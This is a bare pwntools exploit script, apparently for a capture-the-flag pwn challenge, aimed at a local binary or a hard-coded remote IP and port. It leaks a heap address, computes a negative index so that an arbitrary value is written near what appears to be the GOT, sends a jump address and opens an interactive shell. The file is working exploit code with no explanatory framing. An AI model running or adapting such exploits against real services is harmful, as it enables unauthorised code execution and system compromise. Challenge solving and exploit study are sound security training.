from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["43.143.7.127",28768]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./zzzzz")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p, '''
    b *0x4013fb
    ''')

for i in range(16):
    ru('100): ')
    sl(b'101')

ru(b'? \n')
sl(b'10')
ru(b'are: ')
heap_addr_str = rc(9)
print(heap_addr_str)
heap_addr = int(heap_addr_str, 16)
#for i in 
offset = (heap_addr - 0x404018) // 8
ru(b'offset ? ')
sl(str(offset * -1))
ru(b'here\n')
sl(b'4199330')

shell()
